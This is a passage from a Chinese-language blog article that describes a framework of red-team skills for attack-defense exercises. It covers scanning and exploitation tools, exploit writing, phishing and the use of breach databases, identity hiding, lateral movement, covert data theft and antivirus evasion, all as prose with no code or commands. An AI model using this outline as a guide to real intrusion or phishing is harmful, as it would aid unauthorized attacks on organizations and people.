class="headerlink" title="(5） Nmap"></a>(5） Nmap</h4><p>Nmap是Network Mapper的缩写，意为网络映射器，是一款开放源代码的网络探测和安全审核的工具。它的设计目标是快速地扫描大型网络，但也可以用于扫描单个主机。</p><p>Nmap使用原始IP报文来发现网络上有哪些主机，每台主机提供什么样的服务，哪些服务运行在什么操作系统上，这些主机使用了什么类型的报文过滤器或防火墙等。虽然Nmap通常用于安全审核，但许多系统管理员和网络管理员也用它来做一些日常的工作，比如查看整个网络的信息，管理服务升级计划，以及监视主机和服务的运行。</p><p>在实战攻防演习中，Nmap常用来对目标系统进行资产分析。</p><h4 id="6）-Wireshark"><a href="#6）-Wireshark" class="headerlink" title="(6） Wireshark"></a>(6） Wireshark</h4><p>Wireshark是一个免费开源的网络数据包分析软件，它可以帮助网络管理员检测网络问题，帮助网络安全工程师检查信息安全相关问题。</p><p>在实战攻防演习中，数据包分析也是非常重要的基础工作。</p><h4 id="7）-MSF"><a href="#7）-MSF" class="headerlink" title="(7） MSF"></a>(7） MSF</h4><p>MSF是Metasploit Framework的缩写，这不仅仅是一个工具软件，它是为自动化地实施经典的、常规的、复杂新颖的攻击，提供基础设施支持的一个完整框架平台。它可以使使用人员将精力集中在渗透测试过程中那些独特的方面上，以及如何识别信息安全计划的弱点上。</p><p>MSF的能够让用户通过选择它的渗透攻击模块、攻击载荷和编码器来实施一次渗透攻击，也可以更进一步编写并执行更为复杂的攻击技术。</p><h4 id="8）-Cobalt-Strike"><a href="#8）-Cobalt-Strike" class="headerlink" title="(8） Cobalt Strike"></a>(8） Cobalt Strike</h4><p>Cobalt Strike是一款C&#x2F;S架构的商业渗透软件，适合多人团队协作。可模拟APT对抗，进行内网渗透。Cobalt Strike集成了端口转发、端口扫描、Socks代理、提权、凭据导出、钓鱼、远控木马等功能。该工具几乎覆盖了APT攻击链中所需要用到的各个技术环节</p><h2 id="二、-进阶能力"><a href="#二、-进阶能力" class="headerlink" title="二、  进阶能力"></a>二、  进阶能力</h2><p>进阶能力是相对更加高级的实战化白帽能力，学习和掌握的难度高于基础能力，但低于高阶能力，主要包括Web漏洞挖掘、Web开发与编程、编写PoC或EXP等利用、社工钓鱼等四类。</p><h3 id="（一）-Web漏洞挖掘"><a href="#（一）-Web漏洞挖掘" class="headerlink" title="（一） Web漏洞挖掘"></a>（一） Web漏洞挖掘</h3><p>Web漏洞挖掘能力是指针对Web系统或软件进行漏洞挖掘的能力。</p><p>在白帽子挖掘的Web应用漏洞中，比较常见的漏洞形式包括：命令执行、SQL注入、代码执行、逻辑漏洞、解析漏洞、信息泄露、XSS、配置错误、弱口令、反序列化、文件上传、权限绕过等。关于这些漏洞类型的具体含义，参见前述“基础能力”中的“（一）Web漏洞利用”，这里不再累述。</p><h3 id="（二）-Web开发与编程"><a href="#（二）-Web开发与编程" class="headerlink" title="（二） Web开发与编程"></a>（二） Web开发与编程</h3><p>掌握一门或几门的开发与编程语言，是白帽子深入挖掘Web应用漏洞,分析Web站点及业务系统运行机制的重要基础能力。在实战攻防演习中，白帽子最为经常遇到和需要掌握的编程语言包括：Java、PHP、Python、C&#x2F;C++、Golang等。</p><h4 id="1）-Java"><a href="#1）-Java" class="headerlink" title="(1） Java"></a>(1） Java</h4><p>Java是一种面向对象的计算机编程语言，具有简单性、功能强大、分布式、健壮性、安全性、平台独立与可移植性、多线程及动态性的特点，经常用于编写桌面应用程序、Web应用程序、分布式系统和嵌入式系统应用程序等。</p><h4 id="2）-PHP"><a href="#2）-PHP" class="headerlink" title="(2） PHP"></a>(2） PHP</h4><p>PHP原为Personal Home Page的缩写，后更名为 Hypertext Preprocessor，但保留了人们已经习惯的“PHP”的缩写形式。其含义为：超文本预处理器，是一种通用开源脚本语言。PHP主要适用于Web开发领域，是在服务器端执行的，常用的脚本语言。PHP独特的语法混合了C、Java、Perl以及 PHP 自创的语法，利于学习，使用广泛。 </p><h4 id="3）-Python"><a href="#3）-Python" class="headerlink" title="(3） Python"></a>(3） Python</h4><p>Python是一种<a href="https://baike.baidu.com/item/%E8%B7%A8%E5%B9%B3%E5%8F%B0/8558902">跨平台</a>的<a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A8%8B%E5%BA%8F/3220205">计算机程序</a>设计语言， 是一个高层次的，结合了解释性、编译性、互动性和面向对象的<a href="https://baike.baidu.com/item/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80/1379708">脚本语言</a>。最初被设计用于编写自动化脚本(Shell)，随着版本的不断更新和语言新功能的添加，逐渐被用于独立的、大型项目的开发。</p><h4 id="4）-C-x2F-C"><a href="#4）-C-x2F-C" class="headerlink" title="(4） C&#x2F;C++"></a>(4） C&#x2F;C++</h4><p>C&#x2F;C++是一种通用的编程语言，广泛用于系统软件与应用软件的开发。语言具有高效、灵活、功能丰富、表达力强和较高的可移植性等特点，在程序设计中备受青睐，是当前使用最为广泛的编程语言。在Web开发中常用于嵌入式设备的开发。</p><h4 id="5）-Golang"><a href="#5）-Golang" class="headerlink" title="(5） Golang"></a>(5） Golang</h4><p>Golang语言，简称Go语言，是由三位 Google工程师开发的一种静态强类型、编译型语言。Go 语言语法与 C 相近，但具有内存安全、垃圾回收、结构形态及 CSP-style 并发计算等功能。</p><h3 id="（三）-编写PoC或EXP等利用"><a href="#（三）-编写PoC或EXP等利用" class="headerlink" title="（三） 编写PoC或EXP等利用"></a>（三） 编写PoC或EXP等利用</h3><p>编写漏洞验证代码或漏洞利用代码，是比单纯的漏洞发现更加具有实战意义的白帽能力。其中主要包括PoC或EXP等两种方式。</p><p>PoC,是Proof of Concept的缩写，即概念验证，特指为了验证漏洞存在而编写的程序代码。有时也经常被用来作为0day、Exploit（漏洞利用）的别名。</p><p>EXP，是Exploit的缩写，即漏洞利用代码。一般来说，有漏洞不一定就有EXP，而有EXP，就肯定有漏洞。</p><p>PoC和EXP的概念仅有细微的差别，前者用于验证，后者则是直接的利用。能够自主编写PoC或EXP，要比直接使用第三方编写的漏洞利用工具或成熟的漏洞利用代码困难的多。但对于很多没有已知利用代码的漏洞或0day漏洞，自主编写PoC或EXP就显得非常重要了。</p><p>此外，针对不同的目标或在不同的系统环境中，编写PoC或EXP的难度也不同。针对Web应用和智能硬件&#x2F;IoT设备等，编写PoC或EXP相对容易，属于进阶能力；而针对操作系统或安全设备编写PoC或EXP则更加困难，因此属于高阶能力了。</p><h3 id="（四）-社工钓鱼"><a href="#（四）-社工钓鱼" class="headerlink" title="（四） 社工钓鱼"></a>（四） 社工钓鱼</h3><p>社工钓鱼，是指利用社会工程学手法，利用伪装、欺诈、诱导等方式，利用人的安全意识不足或安全能力不足，对目标机构特定人群实施网络攻击的一种手段。社工钓鱼，既是实战攻防演习中经常使用的作战手法，也是黑产团伙或黑客组织最为经常使用的攻击方式。在很多情况下，“搞人”要比“搞系统”容易得多。</p><p>社工钓鱼的方法和手段多种多样。在实战攻防演习中，最为常用，也是最为实用的技能主要有四种：开源情报收集、社工库收集、鱼叉邮件和社交钓鱼。其中，前面两个都属于情报收集能力，而后面两个则属于攻防互动能力。</p><h4 id="1）-开源情报收集"><a href="#1）-开源情报收集" class="headerlink" title="(1） 开源情报收集"></a>(1） 开源情报收集</h4><p>开源情报收集能力，是指在公开的互联网信息平台上，合法收集针对目标机构的关键情报信息的能力。例如，新闻媒体、技术社区、企业官网、客户资源平台等公开信息分享平台都是开源情报收集的重要渠道。白帽子可以通过开源情报收集，获取诸如企业员工内部邮箱、联系方式、企业架构、供应链名录、产品代码等关键情报信息。这些信息都可以为进一步的攻击提供支撑。</p><p>开源情报收集是白帽子首要的情报收集方式，其关键在于要从海量网络信息中，找到并筛选出有价值的情报信息组合。通常情况下，单一渠道公开的机构信息，大多没有什么敏感性和保密性。但如果将不同渠道的多源信息组合起来，就能够形成非常有价值的情报信息。当然，也不排除某些机构会不慎将内部敏感信息泄露在了互联网平台上。白帽子在互联网平台上直接找到机构内部开发代码，找到账号密码本的情况也并不少见。</p><h4 id="2）-社工库收集"><a href="#2）-社工库收集" class="headerlink" title="(2） 社工库收集"></a>(2） 社工库收集</h4><p>社工库收集能力，是指针对特定目标机构的社工库信息的收集能力。</p><p>所谓社工库，通常是指含有大量用户敏感信息的数据库或数据包。这些敏感信息包括但不限于，如账号、密码、姓名、身份证号、电话号码、人脸信息、指纹信息、行为信息等。由于这些信息非常有助于攻击方针对特定目标设计有针对性的社会工程学陷阱，因此将这些信息集合起来的数据包或数据库，就被称为社会工程学库，简称社工库。</p><p>社工库是地下黑产或暗网上交易的重要标的物。不过，在实战攻防演习过程中，白帽子所使用的社工库资源，必须兼顾合法性问题，这就比黑产团伙建立社工库的难度要大得多。</p><h4 id="3）-鱼叉邮件"><a href="#3）-鱼叉邮件" class="headerlink" title="(3） 鱼叉邮件"></a>(3） 鱼叉邮件</h4><p>鱼叉邮件能力，是指通过制作和投递鱼叉邮件，实现对机构内部特定人员有效欺骗的一种社工能力。</p><p>鱼叉邮件是针对特定组织机构内部特定人员的定向邮件欺诈行为，目的是窃取机密数据或系统权限。鱼叉邮件有多种形式，可以将木马程序作为邮件的附件发送给特定的攻击目标，也可以构造特殊的、有针对性的邮件内容诱使目标人回复或点击钓鱼网站。鱼叉邮件主要针对的是安全意识或安全能力不足的机构内部员工。不过，某些设计精妙的鱼叉邮件，即便是经验的安全人员也难以识别。</p><h4 id="4）-社交钓鱼"><a href="#4）-社交钓鱼" class="headerlink" title="(4） 社交钓鱼"></a>(4） 社交钓鱼</h4><p>社交钓鱼能力，是指通过社交软件或社交网站与攻击目标内的成员进行沟通交流，骗取对方信任并借此收集相关情报信息的能力。社交钓鱼，一般建立在使人决断产生认知偏差的基础上，具体形式包括但不限于：微信、QQ等社交软件&#x2F;网站的在线聊天、电话钓鱼、短信钓鱼等。</p><p>社交钓鱼，其实也是网络诈骗活动的主要方法，但以往实战攻防演习中还很少被使用。但随着防守方能力的不断提升，直接进行技术突破的难度越来越大，针对鱼叉邮件也有了很多比较有效的监测方法，于是近两年，社交钓鱼方法的使用就开始越来越多了。</p><h2 id="三、-高阶能力"><a href="#三、-高阶能力" class="headerlink" title="三、  高阶能力"></a>三、  高阶能力</h2><p>高阶能力是最为高级的实战化白帽能力，学习和掌握的难度普遍较高，白帽子通常需要多年的学习和实战经验积累，才能初步掌握其中一小部分的关键能力。从实战角度出发，白帽子的高阶能力主要包括：系统层漏洞利用与防护、系统层漏洞挖掘、身份隐藏、内网渗透、高级安全工具、编写PoC或EXP等高级利用、掌握CPU指令集、团队协作等几个方面。</p><h3 id="（一）-系统层漏洞利用与防护"><a href="#（一）-系统层漏洞利用与防护" class="headerlink" title="（一） 系统层漏洞利用与防护"></a>（一） 系统层漏洞利用与防护</h3><p>为应对各种各样的网络攻击，操作系统内部有很多底层的安全机制。而每一种安全机制，都对应了一定形式的网络攻击方法。对于白帽子来说，学习和掌握底层的系统安全机制，发现程序或系统中安全机制设计的缺陷或漏洞，是实现高水平网络攻击的重要基础技能。在实战攻防演习中，最为实用、也是最为常用的7种典型的系统层安全机制包括：SafeSEH、DEP、PIE、NX、ASLR、SEHOP、GS等。</p><h4 id="1）-SafeSEH"><a href="#1）-SafeSEH" class="headerlink" title="(1） SafeSEH"></a>(1） SafeSEH</h4><p>当系统遭到攻击时，程序运行就会出现异常，并触发异常处理函数。而要使攻击能够继续进行，攻击者就常常需要伪造或篡改系统异常处理函数，使系统无法感知到异常的发生。</p><p>SafeSEH，（Safe Structured exception handling）是Windows操作系统的一种安全机制，专门用于防止异常处理函数被篡改，即在程序调用异常处理函数之前，对要调用的异常处理函数进行一系列的有效性校验，如果发现异常处理函数不可靠或存在安全风险，则应立即终止异常处理函数的调用。反之，如果SafeSEH机制设计不完善或存在缺欠，就有可能被攻击者利用，欺骗或绕过。</p><p>在本文中，白帽子的SafeSEH能力，是指白帽子掌握SafeSEH的技术原理，并能够发现程序或系统中SafeSEH机制的设计缺陷，并加以利用实施攻击的能力。</p><h4 id="2）-DEP"><a href="#2）-DEP" class="headerlink" title="(2） DEP"></a>(2） DEP</h4><p>DEP，是Data Execution Protection的缩写，意为数据执行保护，作用是防止数据页内的数据被当作执行代码来执行，从而引发安全风险。</p><p>从计算机内存的角度看，数据和代码的处理并没有特别明确区分，只不过是在系统的调度下，CPU会对于不同内存区域中的不同数据，进行不一样的计算而已。这就使得系统在处理某些经过攻击者精心构造的数据时，会误将其中的一部分“特殊数据”当作可执行代码来执行，从而触发恶意命令的执行。而DEP机制设计的重要目的就是仿制这种问题的发生；反之，如果DEP机制设计不完善或存在缺欠，就有可能被攻击者所利用，欺骗或绕过。</p><p>在本文中，白帽子的DEP能力，是指白帽子掌握DEP的技术原理，并能够发现程序或系统中DEP机制的设计缺陷，并加以利用实施攻击的能力。</p><h4 id="3）-PIE"><a href="#3）-PIE" class="headerlink" title="(3） PIE"></a>(3） PIE</h4><p>PIE是Position-Independent Executable的缩写，意为地址无关可执行文件，与PIC（Position-Independent Code，地址无关代码）含义基本相同，是Linux或Android系统中动态链接库的一种实现技术。</p><p>在本文中，白帽子的PIE能力，是指白帽子掌握PIE的技术原理，并能够发现程序或系统中PIE机制的设计缺陷，并加以利用实施攻击的能力。</p><h4 id="4）-NX"><a href="#4）-NX" class="headerlink" title="(4） NX"></a>(4） NX</h4><p>NX，是No-eXecute的缩写，意为不可执行，是DEP（数据执行保护）技术中的一种，作用是防止溢出攻击中，溢出的数据被当作可执行代码来执行。NX的基本原理是将数据所在内存页标识为不可执行，当操作系统读到这段溢出数据时，就会抛出异常，而非执行恶意指令。反之，如果NX机制设计不完善或存在缺欠，就可以被攻击者利用并发动溢出攻击。</p><p>在本文中，白帽子的NX能力，是指白帽子掌握NX的技术原理，并能够发现程序或系统中NX机制的设计缺陷，并加以利用实施攻击的能力。</p><h4 id="5）-ASLR"><a href="#5）-ASLR" class="headerlink" title="(5） ASLR"></a>(5） ASLR</h4><p>ASLR，Address Space Layout Randomization的缩写，意为地址空间随机化，是一种操作系统用来抵御缓冲区溢出攻击的内存保护机制。这种技术使得系统上运行的进程的内存地址无法被预测，使得与这些进程有关的漏洞变得更加难以利用。</p><p>在本文中，白帽子的ASLR能力，是指白帽子掌握ASLR的技术原理，并能够发现程序或系统中ASLR机制的设计缺陷，并加以利用实施攻击的能力。</p><h4 id="6）-SEHOP"><a href="#6）-SEHOP" class="headerlink" title="(6） SEHOP"></a>(6） SEHOP</h4><p>SEHOP，是Structured Exception Handler Overwrite Protection的缩写，意为结构化异常处理覆盖保护。其中，结构化异常处理是指按照一定的控制结构或逻辑结构对程序进行异常处理的一种方法。如果结构化异常处理链表上面的某个节点或者多个节点，被攻击者精心构造的数据所覆盖，就可能导致程序的执行流程被控制，这就是SEH攻击。而SEHOP就是Windows操作系统中，针对这种攻击给出的一种安全防护方案。</p><p>在本文中，白帽子的SEHOP能力，是指白帽子掌握SEHOP的技术原理，并能够发现程序或系统中SEHOP机制的设计缺陷，并加以利用实施攻击的能力。</p><h4 id="7）-GS"><a href="#7）-GS" class="headerlink" title="(7） GS"></a>(7） GS</h4><p>GS，意为缓冲区安全性检查，是Windows缓冲区的安全监测机制，用于防止缓冲区溢出攻击。</p><p>缓冲区溢出是指当计算机向缓冲区内填充数据位数时，填充的数据超过了缓冲区本身的容量，于是溢出的数据就会覆盖在合法数据上。理想的情况是：程序会检查数据长度，而且并不允许输入超过缓冲区长度的字符。但是很多程序都会假设数据长度总是与所分配的储存空间相匹配，这就为缓冲区溢出埋下隐患，即缓冲区溢出漏洞。GS就是通过对缓冲区数据的各种校验机制，防止缓冲区溢出攻击的发生。</p><p>在本文中，白帽子的GS能力，是指白帽子掌握GS的技术原理，并能够发现程序或系统中GS机制的设计缺陷，并加以利用实施攻击的能力。</p><h3 id="（二）-系统层漏洞挖掘"><a href="#（二）-系统层漏洞挖掘" class="headerlink" title="（二） 系统层漏洞挖掘"></a>（二） 系统层漏洞挖掘</h3><p>系统层漏洞的挖掘需要很多相对高级的漏洞挖掘技术与方法。从实战角度看，以下6种挖掘方法最为实用：代码跟踪、动态调试、Fuzzing技术、补丁对比、软件逆向静态分析、系统安全机制分析。</p><h4 id="1）-代码跟踪"><a href="#1）-代码跟踪" class="headerlink" title="(1） 代码跟踪"></a>(1） 代码跟踪</h4><p>代码跟踪，是指通过自动化分析工具和人工审查的组合方式，对程序源代码逐条进行检查分析，发现其中的错误信息、安全隐患和规范性缺陷问题，以及由这些问题引发的安全漏洞，提供代码修订措施和建议。</p><h4 id="2）-动态调试"><a href="#2）-动态调试" class="headerlink" title="(2） 动态调试"></a>(2） 动态调试</h4><p>动态调试，原指软件作者利用集成环境自带的调试器跟踪自己软件的运行，来协助解决自己软件的错误。</p><p>不过，对于白帽子来说，动态调试通常是指使用动态调试器（如OllyDbg x64Dbg等），为可执行程序设置断点，通过监测目标程序在断点处的输入输出及运行状态等信息，来反向推测程序的代码结构、运行机制及处理流程等，进而发现目标程序中的设计缺陷或安全漏洞的一种分析方法。</p><h4 id="3）-Fuzzing技术"><a href="#3）-Fuzzing技术" class="headerlink" title="(3） Fuzzing技术"></a>(3） Fuzzing技术</h4><p>Fuzzing技术，是一种基于黑盒（或灰盒）的测试技术，通过自动化生成并执行大量的随机测试用例来触发软件或系统异常，进而发现产品或协议的未知缺陷或漏洞。</p><h4 id="4）-补丁对比"><a href="#4）-补丁对比" class="headerlink" title="(4） 补丁对比"></a>(4） 补丁对比</h4><p>每一个安全补丁，都会对应一个或多个安全漏洞。通过对补丁文件的分析，往往可以还原出相应漏洞的原理或机制。而利用还原出来的漏洞，就可以对尚未打上相关补丁的软件或系统实施有效攻击。而补丁对比，是实战环境下，补丁分析的一种常用的、有效的方式。</p><p>补丁对比，是指对原始文件和补丁文件分别进行反汇编，然后对反汇编后的文件做比较找出其中的差异，从而发现潜在的漏洞的一种安全分析方法。</p><h4 id="5）-软件逆向静态分析"><a href="#5）-软件逆向静态分析" class="headerlink" title="(5） 软件逆向静态分析"></a>(5） 软件逆向静态分析</h4><p>在本文中，软件逆向静态分析，是指将对软件程序实施逆向工程，之后对反编译的源码或二进制代码文件进行分析，进而发现设计缺陷或安全漏洞的一种安全分析方法。</p><p>对开放源代码的程序，通过检测程序中不符合安全规则的文件结构、命名规则、函数、堆栈指针等，就可以发现程序中存在的安全缺陷。被分析目标没有附带源程序时，就需要对程序进行逆向工程，获取类似于源代码的逆向工程代码，然后再进行检索和分析，也可以发现程序中的安全漏洞。这就是软件逆向静态分析。</p><p>软件逆向静态分析，也叫反汇编扫描，由于采用了底层的汇编语言进行漏洞分析，在理论上可以发现所有计算机可运行的漏洞。对于不公开源代码的程序来说，这种方法往往是最有效的发现安全漏洞的办法。</p><h4 id="6）-系统安全机制分析"><a href="#6）-系统安全机制分析" class="headerlink" title="(6） 系统安全机制分析"></a>(6） 系统安全机制分析</h4><p>操作系统的安全机制，就是指在操作系统中，利用某种技术、某些软件来实施一个或多个安全服务的过程。主要包括标识与鉴别机制，访问控制机制，最小特权管理机制，可信通路机制、安全审计机制，以及存储保护、运行保护机制等。</p><p>在本文中，系统安全机制分析能力，是指对操作系统的各种安全机制的进行分析，进而发现系统设计缺陷或安全漏洞的方法。</p><h3 id="（三）-身份隐藏"><a href="#（三）-身份隐藏" class="headerlink" title="（三） 身份隐藏"></a>（三） 身份隐藏</h3><p>为避免自己的真实IP、物理位置、设备特征等信息在远程入侵的过程中被网络安全设备记录，甚至被溯源追踪，攻击者一般都会利用各种方式来进行身份隐藏。在实战攻防演习中，攻击方所采用的身份隐藏技术主要有以下几类：匿名网络、盗取他人ID&#x2F;账号、使用跳板机、他人身份冒用和利用代理服务器等。</p><h4 id="1）-匿名网络"><a href="#1）-匿名网络" class="headerlink" title="(1） 匿名网络"></a>(1） 匿名网络</h4><p>匿名网络泛指信息接受者无法对信息发送者进行身份定位与物理位置溯源，或溯源过程极其困难的通信网络。这种网络通常是在现有的互联网环境下，通过使用特定的通信软件组成的特殊虚拟网络，从而实现发起者的身份隐藏。其中以Tor网络（洋葱网络）为代表的各类“暗网”是比较常用的匿名网络。</p><p>在本文中，白帽子的匿名网络能力，是指白帽子能够使用匿名网络对目标机构发起攻击，并有效隐藏自己身份或位置信息的能力。</p><h4 id="2）-盗取他人ID-x2F-账号"><a href="#2）-盗取他人ID-x2F-账号" class="headerlink" title="(2） 盗取他人ID&#x2F;账号"></a>(2） 盗取他人ID&#x2F;账号</h4><p>盗取他人ID&#x2F;账号，一方面可以使攻击者获取与ID&#x2F;账号相关的系统权限，进而实施非法操作；另一方面也可以使攻击者冒充ID&#x2F;账号所有人的身份进行各种网络操作，从而实现攻击者自身身份隐藏的目的。</p><p>不过，在实战攻防演习中，通常不允许随意盗取与目标机构完全无关人员的ID&#x2F;账号，因此，在本文中，白帽子的盗取他人ID&#x2F;账号能力，是指白帽子能够盗取目标机构及其相关机构内部人员ID&#x2F;账号，以实现有效攻击和身份隐藏的能力。</p><h4 id="3）-使用跳板机"><a href="#3）-使用跳板机" class="headerlink" title="(3） 使用跳板机"></a>(3） 使用跳板机</h4><p>使用跳板机，是指攻击发起者并不直接对目标进行攻击，而是利用中间主机作为跳板机，经过预先设定的一系列路径对目标进行攻击的一种攻击方法。使用跳板机的原因主要有两个方面：一是受到内网安全规则的限制，目标机器可能直接不可达，必须经过跳板机才能间接访问；二是使用跳板机，攻击者可以在一定程度上隐藏自己的身份，使系统中留下的操作记录多为跳板机所为，从而增加防守方溯源分析的难度。</p><p>在本文中，白帽子使用跳板机的能力，是指白帽子能够入侵机构内部网络，获得某些主机控制权限，并以此为跳板，实现内网横向移动的技术能力。</p><h4 id="4）-他人身份冒用"><a href="#4）-他人身份冒用" class="headerlink" title="(4） 他人身份冒用"></a>(4） 他人身份冒用</h4><p>他人身份冒用，是指通过技术手段对身份识别系统或安全分析人员进行欺骗，从而达到冒用他人身份实现登录系统、执行非法操作及投放恶意程序等攻击行为。这里所说的他人身份冒用技术不包括前述的盗取他人ID&#x2F;账号。</p><p>在本文中，白帽子的他人身份冒用能力，是指白帽子能够使用各种技术手段冒用他人身份，入侵特定系统的技术能力。</p><h4 id="5）-利用代理服务器"><a href="#5）-利用代理服务器" class="headerlink" title="(5） 利用代理服务器"></a>(5） 利用代理服务器</h4><p>代理服务器，是指专门为其他联网设备提供互联网访问代理的服务器设备。在不使用代理服务器的情况下，联网设备会直接与互联网相连，并从运营商那里分配获得全网唯一的IP地址。而在使用代理服务器的情况下，联网设备则是首先访问代理服务器，再通过代理服务器访问互联网。</p><p>代理服务器的设计，最初是为了解决局域网内用户联结互联网的需求而提出的，局域网内所有的计算机都通过代理服务器与互联网上的其他主机进行通信。对于被通信的主机或服务器来说，只能识别出代理服务器的地址，而无法识别事出局域网内哪一台计算机与自己通信。</p><p>在实战攻防环境下，攻击方使用代理服务器联网，就可以在一定程度上隐藏自己的IP地址和联网身份，增加防守方的溯源难度和IP封禁难度。在某些情况下，攻击者甚至还会设置多级代理服务器，以此实现更加深度的身份隐藏。</p><p>在本文中，白帽子的利用代理服务器能力，是指白帽子在攻击过程中，能够使用一级或多级代理服务器，从而实现身份隐藏的能力。</p><h3 id="（四）-内网渗透"><a href="#（四）-内网渗透" class="headerlink" title="（四） 内网渗透"></a>（四） 内网渗透</h3><p>内网渗透，是指当攻击方已经完成边界突破，成功入侵到政企机构内部网络之后，在机构内部网络中实施进一步渗透攻击，逐层突破内部安全防护机制，扩大战果或最终拿下目标系统的攻击过程。</p><p>在实战攻防环境下，白帽子比较实用的内网渗透能力包括：工作组或域环境渗透、内网权限维持&#x2F;提权、横向移动、数据窃取和免杀等。</p><h4 id="（1）-工作组、域环境渗透"><a href="#（1）-工作组、域环境渗透" class="headerlink" title="（1） 工作组、域环境渗透"></a>（1） 工作组、域环境渗透</h4><p>工作组和域环境都是机构内部网络结构的基本概念。工作组通常是指一组相互联结，具有共同业务或行为属性的终端（计算机）集合。组内终端权限平等，没有统一的管理员或管理设备。通常来说，工作组的安全能力上线就是每台终端自身的安全能力。</p><p>域环境，则是由域控服务器创建的，具有统一管理和安全策略的联网终端的集合，域控服务器和域管理员账号具有域内最高权限。通常来说，域环境的安全性要比工作组高很多，但如果域管理员账号设置了弱口令，或域控服务器存在安全漏洞，也有可能导致域控服务器被攻击者劫持，进而导致域内所有设备全部失陷。</p><p>出于安全管理的需要，大型机构的内部网络一般都会被划分为若干个域环境，不同的域对应不同的业务和终端，执行不同的网络和安全管理策略。而在一些网络管理相对比较松散的机构中，内网中也可能只有若干的工作组，而没有域环境。</p><p>在本文中，白帽子的工作组、域环境渗透能力，是指白帽子能够掌握内网环境中，工作组或域环境的运行管理机制，能够发现其中的设计缺陷或安全漏洞，并加以利用实施攻击的能力。</p><h4 id="（2）-横向移动"><a href="#（2）-横向移动" class="headerlink" title="（2） 横向移动"></a>（2） 横向移动</h4><p>横向移动，通常是指攻击者攻破某台内网终端&#x2F;主机设备后,以此为基础，对相同网络环境中的其他设备发起的攻击活动，但也常常被用来泛指攻击者进入内网后的各种攻击活动。</p><p>在本文中，白帽子的横向移动能力，是泛指以内网突破点为基础，逐步扩大攻击范围，逐步攻破更多内网设备或办公、业务系统的技术能力。</p><h4 id="（3）-内网权限维持-x2F-提权"><a href="#（3）-内网权限维持-x2F-提权" class="headerlink" title="（3） 内网权限维持&#x2F;提权"></a>（3） 内网权限维持&#x2F;提权</h4><p>攻击者通常是以普通用户的身份接入网络系统或内网环境，要实现攻击，往往还需要提升自身的系统权限，并且使自身获得的高级系统权限能够维持一定的时间，避免被系统或管理员降权。提升系统权限的操作简称提权，维持系统权限的操作简称权限维持。</p><p>在实战环境下，系统提权的主要方式包括：利用系统漏洞提权、利用应用漏洞提权、获取密码&#x2F;认证提权等。</p><p>在本文中，白帽子的内网权限维持&#x2F;提权能力，是指白帽子在内网环境中，能够利用各种安全设计缺陷或安全漏洞，提升自己的系统权限，以及维持提权有效性的技术能力。</p><h4 id="（4）-数据窃取"><a href="#（4）-数据窃取" class="headerlink" title="（4） 数据窃取"></a>（4） 数据窃取</h4><p>对机密或敏感数据的窃取，是实战攻防演习工作中最常见的预设目标之一，也是黑客针对政企机构网络攻击活动的主要目的之一。一般来说，机构内部的很多办公系统、业务系统、生产系统中，都会有专门的服务器或服务器集群用于存储核心数据，数据服务器的防护一般也会比其他网络设备更加严密一些。</p><p>在本文中，白帽子的数据窃取能力，是指白帽子能够熟练掌握服务器的数据库操作，能够在内网中找到机构的核心系统数据服务器，能够获取服务器访问或管理权限，能够在防守方不知情的情况下将数据窃取出来并秘密外传的技术能力。</p><h4 id="（5）-免杀"><a href="#（5）-免杀" class="headerlink" title="（5） 免杀"></a>（5） 免杀</h4><p>免杀，英文为Anti Anti-Virus，是高级的网络安全对抗方式，是各种能使木马病毒程序免于被<a href="https://baike.baidu.com/item/%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6">杀毒软件</a>查杀的技术的总称，可以使攻击者编写的木马病毒程序在目标主机上秘密运行，不被发现。</p><p>免杀技术，不仅要求开发人员具备木马病毒的编写能力，同时还需要对各种主流安全软件的运行框架、杀毒引擎的工作原理、操作系统的底层机制、应用程序的白利用方式等，有非常深入的了解，并能据此编写对抗代码。使用免杀技术，对于白帽的基础能力要求非常之高。</p><p>在本文中，白帽子的免杀技术能力，是指白帽子能够编写木马病毒程序实现免杀的技术能力。通过使用第三方工具（如加密壳）在某些安全防护薄弱的环境下也能达到免杀目的，但这种基础能力不属于本文描述的免杀技术能力。</p><h3 id="（五）-高级安全工具"><a href="#（五）-高级安全工具" class="headerlink" title="（五） 高级安全工具"></a>（五） 高级安全工具</h3><p>高级安全工具同样是白帽子的必修课，只不过这些工具对于使用者有更高的基础技能要求，初学者不易掌握。在实战化环境中，最为经常被用到的工具包括：IDA、Ghidra、Binwalk、OllyDbg、Peach fuzzer等。</p><h4 id="（1）-IDA"><a href="#（1）-IDA" class="headerlink" title="（1） IDA"></a>（1） IDA</h4><p>IDA，是一个专业的反汇编工具，是安全渗透人员进行逆向安全测试的必备工具，具有静态反汇编和逆向调试等功能，能够帮助安全测试人员发现代码级别的高危安全漏洞。</p><h4 id="（2）-Ghidra"><a href="#（2）-Ghidra" class="headerlink" title="（2） Ghidra"></a>（2） Ghidra</h4><p>Ghidra，是一款开源的跨平台软件逆向工具,目前支持的平台有Windows、macOS及Linux，并提供了反汇编、汇编、反编译等多种功能。Ghidra P-Code是专为逆向工程设计的寄存器传输语言，能够对许多不同的处理器进行建模。</p><h4 id="（3）-Binwalk"><a href="#（3）-Binwalk" class="headerlink" title="（3） Binwalk"></a>（3） Binwalk</h4><p>Binwalk，是一个文件扫描提取分析工具，可以用来识别文件内包含的内容和代码。Binwalk不仅可以在标准格式本件中进行分析和提取，还能对非标准格式文件进行分析和提取，包括压缩文件、二进制文件、经过删节的文件、经过变形处理的文件、多种格式相融合的文件等。</p><h4 id="（4）-OllyDbg"><a href="#（4）-OllyDbg" class="headerlink" title="（4） OllyDbg"></a>（4） OllyDbg</h4><p>OllyDbg，是一款强大的反汇编工具。它结合了动态调试与静态分析等功能。是一个用户模式调试器，可识别系统重复使用的函数，并能将其参数注释。OllyDbg还可以调试多线程应用程序，从一个线程切换到另一个线程、挂起、恢复和终止，或改变它们的优先级。</p><h4 id="（5）-Peach-fuzzer"><a href="#（5）-Peach-fuzzer" class="headerlink" title="（5） Peach fuzzer"></a>（5） Peach fuzzer</h4><p>Peach Fuzzer是一款智能模糊测试工具，广泛用于发现软件中的缺陷和漏洞。Peach Fuzzer有两种主要模式：基于生长的模糊测试和基于变异的模糊测试。</p><h3 id="（六）-编写PoC或EXP等高级利用"><a href="#（六）-编写PoC或EXP等高级利用" class="headerlink" title="（六） 编写PoC或EXP等高级利用"></a>（六） 